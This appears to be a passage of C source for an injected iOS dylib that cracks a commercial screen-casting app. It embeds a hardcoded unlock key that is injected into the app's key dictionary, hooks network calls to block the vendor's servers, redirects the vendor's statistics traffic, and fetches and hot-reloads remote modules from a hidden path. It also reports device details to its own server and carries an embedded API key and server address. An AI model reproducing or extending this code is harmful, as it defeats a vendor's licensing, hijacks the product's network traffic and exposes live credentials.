// ★ v6：模块目录运行时可换（隐秘路径）。默认 MOD_DIR_DEF，可被 conf 的 moddir 覆盖。
static char   g_mod_dir[256] = MOD_DIR_DEF;

// ★ v6：心跳失联计数（跨线程计数，仅 puller 线程读写 + 其他线程只读）
static volatile int  g_hb_miss  = 0;    // 连续失败次数
static volatile int  g_hb_ok    = 0;    // 最近一次是否成功（1=授权中）
static volatile long g_hb_last  = 0;    // 最近成功的时间戳（秒）
static int           g_hb_max   = HB_MISS_MAX_DEF;  // ★ v6.1 运行时阈值（conf hbmiss=）

// 拼好的 query string（"?key=xxx&nm=..&md=..&ov=.." 或 ""）——纯 C 拼接，供 URL 构造直接 snprintf 用
static char   g_qbuf[512] = {0};

// 请求重灌（跨线程安全的「置位」，由主线程/watchdog 执行实际注入）
static volatile int g_need_inject = 0;

// ★ v6.4：运行模式（conf `mode=probe` 切到真卡机只读雷达）
static int g_mode = MODE_UNLOCK;

// ★ v6.4：密钥字典快照（纯 C 副本，probe 线程只读它，避免裸线程反复碰 ObjC 字典）
static unsigned char g_mh_snap[MH_SNAP_MAX][35];   // [3B ver][32B val]
static int           g_mh_n = 0;

// ★ v6.5：已注入的本地版本号（"020909"），供 bs_inject_mh 做「按版本幂等」快路径。
static char          g_mh_ver[8]  = {0};
// ★ v6.5：云端暂无密钥的版本号 + 重试计数（节流用）
static char          g_mh_miss[8] = {0};
static int           g_mh_try     = 0;

// ★ v6.14：最近一次成功注入的「版本号 + 32B 密钥」缓存。
//   产品整表替换字典后，同版本可以**离线**（不碰网络）秒补回去。
static unsigned char g_mh_kk[3]     = {0};
static unsigned char g_mh_vv[32]    = {0};
static volatile int  g_mh_cached    = 0;

// ★ v6.15：载荷记录版本（厂商固定 020909）的密钥缓存 —— 供被冲掉时离线秒补
static unsigned char g_pay_vv[32]    = {0};
static volatile int  g_pay_cached    = 0;
static char          g_pay_miss[8]   = {0};
static int           g_pay_try       = 0;

// ★ v6.18：多版本键（3.0.5 起 lua 记录自带独立版本键）—— per-ver 节流表 + 扫描缓存
#define EK_VERS_MAX       12     // 一份 beta.so 里最多跟踪 12 个不同版本键
static char          g_ek_miss[EK_VERS_MAX][8] = {{0}};   // 上次取键失败的版本（节流）
static int           g_ek_try[EK_VERS_MAX]     = {0};
static unsigned char g_ek_vers[EK_VERS_MAX][3] = {{0}};   // 盘上 beta.so 扫出的段版本集合
static int           g_ek_nver = 0;
static off_t         g_ek_scan_size  = -1;                // 扫描缓存：文件没变不重扫
static long long     g_ek_scan_mtime = -1;

// ★ v6.20：自有卡密系统（v3 并入 BSModuleServer，同协议 /api/client/login）
//   v6.23h：默认 host 18095(CardVault 弃用)→47391(bsmod v3 卡密，2026-10-03)
#define CARD_HOST_DEF  "47.116.161.226:47391"
#define CARD_KEY_DEF   "ak_ba5f7a4ae954dadbb2eaa82ae237967587212d4a6efb0ef4"
#define CARD_PATH      "/api/client/login"
static char          g_card_host[64]  = CARD_HOST_DEF;
static char          g_card_key[80]   = CARD_KEY_DEF;
static int           g_cardcheck      = 1;     // 缺省开（probe 模式整体 early-return 不受影响）
static int           g_cardgrace      = 1;     // 网络失败宽限（小时；v6.23g 72→1，用户拍板）
static int           g_cardtick       = 120;   // 心跳间隔（秒）★ v6.23u 300→120（code=7 被踢感知缩到 2 分钟）
static volatile int  g_card_blocked   = 0;     // 1=封禁（未激活/过期/冻结/绑他机/宽限耗尽）
static volatile long g_card_expire    = 0;     // 到期 unix ts（0=未知）
static volatile long g_card_lastok    = 0;     // 最近一次校验成功时间
static char          g_card_cur[80]   = {0};   // 上次见过的卡密（变更→重新激活）
static char          g_card_kicked[80]= {0};   // ★ v6.23s 被 code=7 踢掉的卡（本地拉黑，防接管振荡）
static long          g_card_kickts    = 0;     // ★ v6.23t 被踢时刻（unix ts）——解除拉黑须「更晚的新输入」
static char          g_card_devid[64] = {0};   // device_id：hw.serial，回退 token
static char          g_cardval[80]    = {0};   // ★ v6.21：conf cardval= 手动卡密（兜底通道）

// ★ v6.19：厂商服务器进程内屏蔽（仅 unlock 模式安装钩子）
static volatile int  g_block_vps     = 1;    // conf `blockvps=`（缺省开）
static volatile int  g_blk_installed = 0;
static volatile long g_blk_n_connect = 0;    // connect 拦截计数
static volatile long g_blk_n_dns     = 0;    // getaddrinfo 拦截计数
#define VPS_DOMAIN   "vps.beibeiplay.com"
#define VPS_IP_STR   "43.154.19.236"
static uint32_t      g_vps_ip_net = 0;       // 网络字节序

// ★ v6.23l：统计上报改道。v6.23m 目标解析顺序：conf statip= 优先；
//   未配置 → 每次现读 app.plist 的中控 ip（端口 7875/7880 不变）。
//   两者都无 → 不改道（原样发厂商）。
//   不依赖 beta.so 版本/lua 变量名；probe 模式同样生效（只碰统计 IP，卡密链路无关）。
#define STAT_VENDOR_IP "60.204.159.47"
static char          g_stat_ip[64]  = {0};   // 改道目标（点分十进制）
static uint32_t      g_stat_ip_net  = 0;     // 目标（网络字节序；0=关闭）
static uint32_t      g_stat_vp_net  = 0;     // 厂商统计 IP（网络字节序）
static volatile long g_stat_n_redir = 0;     // 改道计数

// ★ v6.6：主动跟版（conf sosync= / sotick=）
static int           g_so_sync = 1;
static int           g_so_tick = SO_SYNC_TICK_SECS;

// ★ v6.7：落盘后自动重启（conf autoreload=，默认开）
static int           g_autoreload   = 1;
// ★ v6.17：func-nil 崩溃自动恢复（conf crashresume=，默认开）
static int           g_crashresume  = 1;
// ★ v6.24q：g_need_reload / g_reload_busy / g_rl_ver 已随 [rl] 移除

static void bs_request_inject(uintptr_t base) {
    (void)base;
    g_need_inject = 1;
    bs_log("[pull] inject requested");
}

// ---- ★ v6.10 设备信息上报（纯 C：sysctl + 百分号编码） ----
static int bs_read_file(const char *path, unsigned char **out, size_t *outlen); // ★ v6.11 前置声明

static void bs_sysctl_str(const char *name, char *out, size_t n) {
    size_t len = n;
    memset(out, 0, n);
    if (sysctlbyname(name, out, &len, NULL, 0) != 0) { out[0] = 0; return; }
    if (len >= n) len = n - 1;
    out[len] = 0;   // len 可能含结尾 nul，多补一个无妨
}

static void bs_urlenc(const char *in, char *out, size_t n) {
    static const char *HEX = "0123456789ABCDEF";
    size_t j = 0;
    for (const unsigned char *p = (const unsigned char *)in; *p && j + 4 < n; p++) {
        unsigned char c = *p;
        if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            out[j++] = (char)c;
        } else {
            out[j++] = '%'; out[j++] = HEX[c >> 4]; out[j++] = HEX[c & 15];
        }
    }
    out[j] = 0;
}

// ★ v6.11：读 app.plist 的 <key>ip</key> → 其后的 <string>（中控 IP，用户手填）。
//   只作上报数据，不作服务端地址（v6.2 起与 BS_HOST 互不干扰）。
static void bs_pc_ip_of_plist(char *out, size_t n) {
    out[0] = 0;
    unsigned char *b = NULL; size_t bl = 0;
    if (!bs_read_file(DATA_DIR "/app.plist", &b, &bl)) return;
    const char *s = (const char *)b;
    const char *k = strstr(s, "<key>ip</key>");
    if (k) {
        const char *v = strstr(k, "<string>");
        if (v) {
            v += 8;
            const char *e = strstr(v, "</string>");
            if (e && (size_t)(e - v) < n) {
                memcpy(out, v, e - v);
                out[e - v] = 0;
            }
        }
    }
    free(b);
}

// 生成 "&nm=<设备名>&md=<型号>&ov=<系统版本>[&pc=<中控IP>]"；全空则返回空串
static void bs_devinfo_query(char *out, size_t n) {
    char hn[128], mach[64], osv[32], pc[64];
    char hn_e[384], mach_e[200], osv_e[100], pc_e[200];
    bs_sysctl_str("kern.hostname", hn, sizeof(hn));
    bs_sysctl_str("hw.machine", mach, sizeof(mach));
    bs_sysctl_str("kern.osproductversion", osv, sizeof(osv));
    bs_pc_ip_of_plist(pc, sizeof(pc));
    if (!hn[0] && !mach[0] && !osv[0] && !pc[0]) { out[0] = 0; return; }
    bs_urlenc(hn, hn_e, sizeof(hn_e));
    bs_urlenc(mach, mach_e, sizeof(mach_e));
    bs_urlenc(osv, osv_e, sizeof(osv_e));
    snprintf(out, n, "&nm=%s&md=%s&ov=%s", hn_e, mach_e, osv_e);
    // ★ v6.23p：dylib 版本号随心跳上报（服务端设备表显示，装没装一眼可见）
    {
        size_t cur = strlen(out);
        if (cur + strlen("&dv=") + strlen(BS_DYLIB_VER) + 1 < n)
            snprintf(out + cur, n - cur, "&dv=" BS_DYLIB_VER);
    }
    if (pc[0]) {   // ★ v6.11：追加中控 IP
        bs_urlenc(pc, pc_e, sizeof(pc_e));
        size_t cur = strlen(out);
        if (cur + strlen(pc_e) + 8 < n)
            snprintf(out + cur, n - cur, "&pc=%s", pc_e);
    }
}

static void bs_load_conf(void) {
    g_stat_vp_net = inet_addr(STAT_VENDOR_IP);   // ★ v6.23l：厂商统计 IP（固定常量）
    FILE *f = fopen(PULL_CONF, "r");
    if (!f) return;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        char *k = line, *v = eq + 1;
        // 去空白与换行
        while (*k == ' ' || *k == '\t') k++;
        char *ke = k + strlen(k);
        while (ke > k && (ke[-1] == ' ' || ke[-1] == '\t' || ke[-1] == '\r' || ke[-1] == '\n')) *--ke = 0;
        while (*v == ' ' || *v == '\t') v++;
        char *ve = v + strlen(v);
        while (ve > v && (ve[-1] == ' ' || ve[-1] == '\t' || ve[-1] == '\r' || ve[-1] == '\n')) *--ve = 0;

        if (!strcmp(k, "host") && v[0]) {          // ★ v6.2：可选覆盖服务端地址
            strncpy(g_host, v, sizeof(g_host) - 1);
            g_host[sizeof(g_host)-1] = 0;
        }
        else if (!strcmp(k, "port"))  g_port = atoi(v);
        else if (!strcmp(k, "tick"))  g_tick = atoi(v);
        else if (!strcmp(k, "enable")) g_enable = atoi(v);
        else if (!strcmp(k, "token")) { strncpy(g_token, v, sizeof(g_token) - 1); g_token[sizeof(g_token)-1] = 0; }
        else if (!strcmp(k, "hbmiss")) {
            // ★ v6.1：心跳失联容忍次数（clamp 到 1..60，防止写出 0 导致误杀）
            int m = atoi(v);
            if (m < 1)  m = 1;
            if (m > 60) m = 60;
            g_hb_max = m;
        }
        else if (!strcmp(k, "moddir") && v[0] == '/') {
            strncpy(g_mod_dir, v, sizeof(g_mod_dir) - 1);
            g_mod_dir[sizeof(g_mod_dir)-1] = 0;
        }
        else if (!strcmp(k, "mode")) {
            // ★ v6.4：只有 probe 走雷达模式，其余（含拼错）一律按 unlock，避免误配成「什么都不做」
            g_mode = (!strcmp(v, "probe")) ? MODE_PROBE : MODE_UNLOCK;
        }
        else if (!strcmp(k, "sosync")) {
            // ★ v6.6：主动跟版开关（写 0 关掉；缺省开）
            g_so_sync = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "autoreload")) {
            // ★ v6.7：落盘后自动重启开关（缺省开；写 0 关掉，只落盘不动脚本）
            g_autoreload = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "crashresume")) {
            // ★ v6.17：func-nil 崩溃自动恢复开关（缺省开；写 0 关掉）
            g_crashresume = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "blockvps")) {
            // ★ v6.19：厂商服务器（vps.beibeiplay.com / 43.154.19.236）进程内屏蔽开关
            //   （缺省开；仅 unlock 模式生效，probe 真卡机永不装钩子）
            g_block_vps = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "cardcheck")) {
            // ★ v6.20：自有卡密系统开关（缺省开；仅 unlock 模式起 cardwatch）
            g_cardcheck = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "cardgrace")) {
            // ★ v6.20：网络失败宽限（小时）——超时未成功校验才封禁
            g_cardgrace = atoi(v);
            if (g_cardgrace < 0) g_cardgrace = 1;
        }
        else if (!strcmp(k, "cardtick")) {
            // ★ v6.20：login 心跳间隔（秒）
            g_cardtick = atoi(v);
            if (g_cardtick < 60) g_cardtick = 60;
        }
        else if (!strcmp(k, "cardkey")) {
            // ★ v6.20：CardVault 应用 app_key（X-Card-Key 头）
            snprintf(g_card_key, sizeof(g_card_key), "%s", v);
        }
        else if (!strcmp(k, "cardhost")) {
            // ★ v6.20：CardVault 服务地址 host:port
            snprintf(g_card_host, sizeof(g_card_host), "%s", v);
        }
        else if (!strcmp(k, "statip")) {
            // ★ v6.23l：统计上报改道目标（点分 IP）。空值/非法值=关闭改道。
            if (v[0]) {
                uint32_t n = inet_addr(v);
                if (n != 0xFFFFFFFF && n != 0) {
                    snprintf(g_stat_ip, sizeof(g_stat_ip), "%s", v);
                    g_stat_ip_net = n;
                }
            }
        }
        else if (!strcmp(k, "cardval")) {
            // ★ v6.21：手动卡密（兜底通道）——getter/日志捕获均无卡时用它激活
            snprintf(g_cardval, sizeof(g_cardval), "%s", v);
        }
        else if (!strcmp(k, "sotick")) {
            // ★ v6.6：跟版复查间隔（clamp 30..3600，防 0 造成忙等）
            int t = atoi(v);
            if (t < SO_SYNC_MIN_TICK) t = SO_SYNC_MIN_TICK;
            if (t > SO_SYNC_MAX_TICK) t = SO_SYNC_MAX_TICK;
            g_so_tick = t;
        }
        else if (!strcmp(k, "sohost") && v[0]) {
            // ★ v6.9：局域网中继地址（仅 beta.so 下载走它；空/缺省=直连云端）
            strncpy(g_sohost, v, sizeof(g_sohost) - 1);
            g_sohost[sizeof(g_sohost)-1] = 0;
        }
        else if (!strcmp(k, "soport")) {
            // ★ v6.9：中继端口（<=0 时回落 g_port）
            g_soport = atoi(v);
        }
    }
    fclose(f);

    // 拼 query string（纯 C）：有 token 就 "?key=xxx"，否则空串。
    // 拼好后 bs_pull_modules 直接 snprintf 进 URL，不必再碰 ObjC。
    if (g_token[0]) snprintf(g_qbuf, sizeof(g_qbuf), "?key=%s", g_token);
    else            g_qbuf[0] = 0;
    // ★ v6.10：追加设备信息（/hb 与 /manifest 同带；服务端只解析 /hb）
    {
        char q[384];
        bs_devinfo_query(q, sizeof(q));
        if (q[0]) {
            size_t cur = strlen(g_qbuf);
            if (cur + strlen(q) < sizeof(g_qbuf))
                memcpy(g_qbuf + cur, q, strlen(q) + 1);
        }
    }

    // ★ v6.12：缓存 app.plist 的中控 ip —— beta.so 中继地址直接用它（见 so_sync 下载处）
    bs_pc_ip_of_plist(g_appip, sizeof(g_appip));

    bs_log("[conf] dylib=%s port=%d tick=%d enable=%d mode=%s token=%s q=%s moddir=%s hbmiss=%d sosync=%d sotick=%d autoreload=%d crashresume=%d blockvps=%d cardcheck=%d cardgrace=%d cardtick=%d cardhost=%s cardval=%s sohost=%s soport=%d appip=%s statip=%s",
           BS_DYLIB_VER,
           g_port, g_tick, g_enable, g_mode == MODE_PROBE ? "probe" : "unlock",
           g_token[0] ? "(set)" : "(none)",
           g_qbuf[0] ? g_qbuf : "(none)", g_mod_dir, g_hb_max,
           g_so_sync, g_so_tick, g_autoreload,
           g_crashresume, g_block_vps,
           g_cardcheck, g_cardgrace, g_cardtick,
           g_card_host, g_cardval[0] ? "(set)" : "(none)",
           g_sohost[0] ? g_sohost : "(none)", g_soport,
           g_appip[0] ? g_appip : "(none)",
           g_stat_ip[0] ? g_stat_ip : "(off->appip)");
}

// ---- 日志（提前定义，供 bs_load_conf 使用）
//
// ★★ 2026-09-26 修正：绝对不能在这里用 NSLog！
//    bs_log 会在两条裸 pthread 线程（bs_watchdog / bs_puller）以及 +load 早期
//    阶段被调用。NSLog 是 ObjC 调用，在 ObjC runtime / autorelease pool / TLS
//    尚未就绪时会走到 objc_msgSend 上对坏指针解引用，实测崩溃：
//      EXC_BAD_ACCESS (SIGSEGV) KERN_INVALID_ADDRESS at 0x10
//      thread: objc_msgSend <- bs_puller <- _pthread_start
//    改成纯 POSIX（write + 手工拼时间戳），任何线程任何阶段都安全。
static void bs_log(const char *fmt, ...) {
    char buf[768];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    // 手工时间戳（避免 time/localtime 的锁问题，直接用 clock_gettime + 简单换算）
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    char line[896];
    int n = snprintf(line, sizeof(line), "[%ld.%03ld] %s\n",
                     (long)ts.tv_sec, (long)(ts.tv_nsec / 1000000), buf);
    if (n < 0) return;
    if ((size_t)n > sizeof(line)) n = (int)sizeof(line);

    // 只写文件，不碰 ObjC。/tmp 与 App 数据目录都试一遍。
    int fd = open(BS_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) fd = open("/tmp/bs_unlock.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        ssize_t w = write(fd, line, (size_t)n);
        (void)w;
        close(fd);
    }
}

/// ★ v6.24r：决策级事件双写 —— 主日志保留原样（现场连着看），同时追加到
///   bs_evt.log 专道。只给 [us]/[cr]/[so]/[wd] 这类低频关键事件用；
///   [pull]/[hb]/[devlog] 这些高频流水仍然只走 bs_log，绝不进事件道。
static void bs_evt(const char *fmt, ...) {
    char buf[768];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    bs_log("%s", buf);            // 主日志照旧

    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    char line[896];
    int n = snprintf(line, sizeof(line), "[%ld.%03ld] %s\n",
                     (long)ts.tv_sec, (long)(ts.tv_nsec / 1000000), buf);
    if (n <= 0) return;
    if ((size_t)n > sizeof(line)) n = (int)sizeof(line);
    int fd = open(BS_EVT_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        ssize_t w = write(fd, line, (size_t)n);
        (void)w;
        close(fd);
    }
}

// ---------------------------------------------------------------- v6.24r 运行库生效状态
/// 落盘新 so 时写 pend=1；脚本真正启动（run 0->1）时清 0。
/// 任意线程可写（原子 rename），watchdog 每 5 分钟读一次诊断，无锁需求。
static void bs_so_state_write(int pending, const char *md5, long size) {
    char tmp[320], fin[320];
    snprintf(tmp, sizeof(tmp), "%s.tmp", BS_SO_STATE_PATH);
    snprintf(fin, sizeof(fin), "%s", BS_SO_STATE_PATH);
    FILE *f = fopen(tmp, "w");
    if (!f) return;
    long now = (long)time(NULL);
    long applied = 0;
    // 保留上次 applied（清 pend 时要沿用）
    {
        FILE *p = fopen(fin, "r");
        if (p) {
            char b[256] = {0};
            if (fgets(b, sizeof(b), p)) {
                const char *q = strstr(b, "applied=");
                if (q) applied = atol(q + 8);
            }
            fclose(p);
        }
    }
    if (!pending) applied = now;
    fprintf(f, "md5=%s size=%ld disk=%ld pend=%d applied=%ld\n",
            md5 ? md5 : "?", size, now, pending, applied);
    fclose(f);
    rename(tmp, fin);
}

/// 读状态：返回 1=有记录；md5out/size/pend/applied 均可为 NULL
static int bs_so_state_read(char *md5out, size_t mn, long *size, int *pend, long *applied) {
    FILE *f = fopen(BS_SO_STATE_PATH, "r");
    if (!f) return 0;
    char b[256] = {0};
    int ok = (fgets(b, sizeof(b), f) != NULL);
    fclose(f);
    if (!ok) return 0;
    if (md5out && mn) {
        md5out[0] = 0;
        const char *q = strstr(b, "md5=");
        if (q) {
            size_t i = 0;
            q += 4;
            while (i + 1 < mn && q[i] && q[i] != ' ' && q[i] != '\n') { md5out[i] = q[i]; i++; }
            md5out[i] = 0;
        }
    }
    if (size)     { const char *q = strstr(b, "size=");    *size    = q ? atol(q + 5) : -1; }
    if (pend)     { const char *q = strstr(b, "pend=");    *pend    = q ? atoi(q + 5) : -1; }
    if (applied)  { const char *q = strstr(b, "applied="); *applied = q ? atol(q + 8) : 0;  }
    return 1;
}

static const unsigned char kKey[3] = {0x02, 0x09, 0x09};

static const unsigned char kVal[32] = {
    0xa3, 0xa4, 0xe3, 0x3e, 0xa9, 0x13, 0xee, 0xe6,
    0xd8, 0x7d, 0x86, 0x27, 0x8b, 0x5b, 0xc4, 0x53,
    0x1e, 0xd3, 0x51, 0x49, 0xef, 0xb2, 0x87, 0x9f,
    0xa0, 0x24, 0xf1, 0xc9, 0x81, 0xa1, 0x43, 0x9b
};

static uintptr_t g_base = 0;


static uintptr_t bs_find_base(void) {
    uint32_t count = _dyld_image_count();
    for (uint32_t i = 0; i < count; i++) {
        const char *name = _dyld_get_image_name(i);
        if (name && strstr(name, AGENT_NAME)) {
            return (uintptr_t)_dyld_get_image_header(i);
        }
    }
    return 0;
}

// ---------------------------------------------------------------- 模块注入
static int bs_inject_modules(uintptr_t base);

// ---------------------------------------------------------------- v5 拉取
// ---- md5（自实现，避免依赖 CommonCrypto 的链接细节）
typedef struct { uint32_t a, b, c, d; } md5_ctx;

static uint32_t rol(uint32_t x, int c) { return (x << c) | (x >> (32 - c)); }

static void md5_block(md5_ctx *ctx, const unsigned char *p) {
    static const uint32_t K[64] = {
        0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
        0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
        0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
        0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
        0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
        0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
        0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
        0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
    };
    static const int S[64] = {
        7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
        5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
        4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
        6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
    };
    uint32_t M[16];
    for (int i = 0; i < 16; i++)
        M[i] = (uint32_t)p[i*4] | ((uint32_t)p[i*4+1] << 8) |
               ((uint32_t)p[i*4+2] << 16) | ((uint32_t)p[i*4+3] << 24);
    uint32_t A = ctx->a, B = ctx->b, C = ctx->c, D = ctx->d;
    for (int i = 0; i < 64; i++) {
        uint32_t F; int g;
        if (i < 16)      { F = (B & C) | (~B & D);          g = i; }
        else if (i < 32) { F = (D & B) | (~D & C);          g = (5*i + 1) % 16; }
        else if (i < 48) { F = B ^ C ^ D;                   g = (3*i + 5) % 16; }
        else             { F = C ^ (B | ~D);                g = (7*i) % 16; }
        uint32_t tmp = D;
        D = C; C = B;
        B = B + rol(A + F + K[i] + M[g], S[i]);
        A = tmp;
    }
    ctx->a += A; ctx->b += B; ctx->c += C; ctx->d += D;
}

// ---- 纯 C 版 md5 工具（路线 A 专用）

/// 把二进制摘要转 32 字符小写 hex
static void bs_md5_hex(const unsigned char *d, size_t n, char *out, size_t outsz) {
    static const char hx[] = "0123456789abcdef";
    if (outsz < 33) { if (outsz) out[0] = 0; return; }
    (void)n;    // n 恒为 16
    for (int i = 0; i < 16; i++) {
        out[i * 2]     = hx[d[i] >> 4];
        out[i * 2 + 1] = hx[d[i] & 0x0f];
    }
    out[32] = 0;
}

/// 计算文件 md5（纯 POSIX 读；成功返回 1，并写 32 字符 hex 到 out）
///
/// 用「积攒到 64 字节就吃一块」的增量写法，对任意大小文件都正确。
/// 不依赖 ObjC，也没有 memmove 重排的边界坑。
static int bs_md5_file(const char *path, char *out, size_t outsz) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;

    md5_ctx ctx = {0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476};
    unsigned char buf[4096];
    unsigned char acc[64];      // 未满一块的余量
    size_t accn = 0;
    uint64_t total = 0;
    ssize_t r;

    while ((r = read(fd, buf, sizeof(buf))) > 0) {
        size_t len = (size_t)r;
        size_t off = 0;

        // 1) 先补齐 acc 到 64
        if (accn) {
            size_t need = 64 - accn;
            size_t take = (len < need) ? len : need;
            memcpy(acc + accn, buf, take);
            accn += take;
            off  += take;
            if (accn == 64) { md5_block(&ctx, acc); accn = 0; }
        }

        // 2) 整块直接吃
        while (off + 64 <= len) {
            md5_block(&ctx, buf + off);
            off += 64;
        }

        // 3) 余量存 acc
        if (off < len) {
            accn = len - off;
            memcpy(acc, buf + off, accn);
        }
        total += len;
    }
    close(fd);
    if (r < 0) return 0;

    // 收尾 padding（total 为真实字节数）
    unsigned char tail[128];
    memset(tail, 0, sizeof(tail));
    memcpy(tail, acc, accn);
    tail[accn] = 0x80;
    size_t padlen = (accn < 56) ? 64 : 128;
    uint64_t bits = total * 8;
    for (int i = 0; i < 8; i++)
        tail[padlen - 8 + i] = (unsigned char)(bits >> (8 * i));
    md5_block(&ctx, tail);
    if (padlen == 128) md5_block(&ctx, tail + 64);

    unsigned char dig[16];
    for (int i = 0; i < 4; i++) {
        dig[i]      = (unsigned char)(ctx.a >> (8 * i));
        dig[i + 4]  = (unsigned char)(ctx.b >> (8 * i));
        dig[i + 8]  = (unsigned char)(ctx.c >> (8 * i));
        dig[i + 12] = (unsigned char)(ctx.d >> (8 * i));
    }
    bs_md5_hex(dig, 16, out, outsz);
    return 1;
}

/// 计算内存 buffer 的 md5 —— ★ 必须用它来算下载到的模块字节！
///   （v5.4 首版把 mlen 字节的原文直接丢给 bs_md5_hex 了，那是「转 hex」不是「算摘要」，
///     结果 got 变成文件开头的 ASCII "function operate..." 的 hex。此函数修正之。）
static void bs_md5_buf(const unsigned char *data, size_t len, char *out, size_t outsz) {
    md5_ctx ctx = {0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476};
    size_t full = len / 64;
    for (size_t i = 0; i < full; i++) md5_block(&ctx, data + i * 64);

    unsigned char tail[128];
    memset(tail, 0, sizeof(tail));
    size_t rem = len % 64;
    memcpy(tail, data + full * 64, rem);
    tail[rem] = 0x80;
    size_t padlen = (rem < 56) ? 64 : 128;
    uint64_t bits = (uint64_t)len * 8;
    for (int i = 0; i < 8; i++)
        tail[padlen - 8 + i] = (unsigned char)(bits >> (8 * i));
    md5_block(&ctx, tail);
    if (padlen == 128) md5_block(&ctx, tail + 64);

    unsigned char dig[16];
    for (int i = 0; i < 4; i++) {
        dig[i]      = (unsigned char)(ctx.a >> (8 * i));
        dig[i + 4]  = (unsigned char)(ctx.b >> (8 * i));
        dig[i + 8]  = (unsigned char)(ctx.c >> (8 * i));
        dig[i + 12] = (unsigned char)(ctx.d >> (8 * i));
    }
    bs_md5_hex(dig, 16, out, outsz);
}

/// ★ v6.2：取模块/心跳服务端地址。
///   直接返回内置 BS_HOST_DEF（可被 bs_pull.conf 的 host= 覆盖），
///   **不再读 app.plist** —— 那个文件的 ip 是贝塔投屏 App 连电脑中控用的，
///   与本补丁无关，读它会导致两者互相踩。
static int bs_get_host_c(char *out, size_t outsz) {
    if (!g_host[0]) { bs_log("[ip] host empty (BS_HOST_DEF broken?)"); return 0; }
    snprintf(out, outsz, "%s", g_host);
    return 1;
}

/// ★ v6：同步 GET，额外带出 HTTP 状态码（心跳要按 200 判定授权）。
///   语义与 bs_http_get_c 完全一致；源码里实现顺序相反，故此处前置声明。
///   ★ v6.8 拆出带超时参数的 bs_http_get_ex_tmo，bs_http_get_ex 变成 6s 默认包装。
static unsigned char *bs_http_get_ex_tmo(const char *curl, size_t *outlen, long *outcode,
                                         int tmo_req, int tmo_res);
static unsigned char *bs_http_get_ex(const char *curl, size_t *outlen, long *outcode);
static unsigned char *bs_http_post_key(const char *curl, const char *ctype,
                                       const char *xcardkey,
                                       const void *body, size_t blen,
                                       size_t *outlen, long *outcode); // ★ v6.20 前置声明

/// 同步 GET（阻塞，超时 PULL_TIMEOUT 秒）—— 返回 malloc 的 buffer（调用方 free），
/// 长度写入 *outlen。失败返回 NULL。
///
/// ★★ 这是本项目里**唯一**允许在裸 pthread 上调用的 ObjC 网络路径。
///    实测（2026-09-26，.45）：NSURLSession + GCD 信号量汇合在自建线程上完全可用
///    （step5 http_get returned len=506 稳定通过）；崩的是它后面的 NSJSONSerialization。
///    为了把误用面降到最小，这里刻意只在函数体内用 ObjC，出口全部转成 C buffer。
///
/// ★★★ v5.5 修复（2026-09-26，根治 use-after-free 崩溃）★★★
///    崩溃报告（_crash_230340.ips / _crash_230254.ips，均 Signal 11）：
///      #0 libobjc.A.dylib  objc_msgSend        (+0x2414)
///      #1 bs_unlock.dylib  bs_http_get_c       (+0x5f04)   <-- 就是 [out length]
///      #2 bs_unlock.dylib  bs_puller           (+0x5954 / +0x4b24)
///    faultingThread=7（自建 pthread），KERN_INVALID_ADDRESS at 0x10。
///
///    根因：**本 dylib 是 MRR 编译的（CI 没有 -fobjc-arc）**，`__block NSData *out`
///    只是裸指针槽位。completion block 里的 `out = d` **不产生 retain**：
///    `d` 属于 NSURLSession 回调队列的 autorelease pool，block 返回后即被回收。
///    等 dispatch_semaphore_wait 醒来再访问 `out.length`（0x5f00 的 objc_msgSend$length）
///    已经指向已释放对象 → objc_msgSend 在野指针上取 isa → 0x10 处 SIGSEGV。
///    （`done==YES` 但崩溃照样发生，正是 use-after-free 的典型特征。）
///
///    修法：**在回调线程内部当场把字节 memcpy 进堆 buffer**，锁外再搬给调用方。
///    这样跨线程共享的只有一个 `void*` + 两个整数，ObjC 对象生命周期完全不出 block。
struct bs_http_slot {
    unsigned char *buf;     // malloc 出来的副本（NULL = 失败）
    size_t         len;
    long           code;    // HTTP status，0 = 未知
};

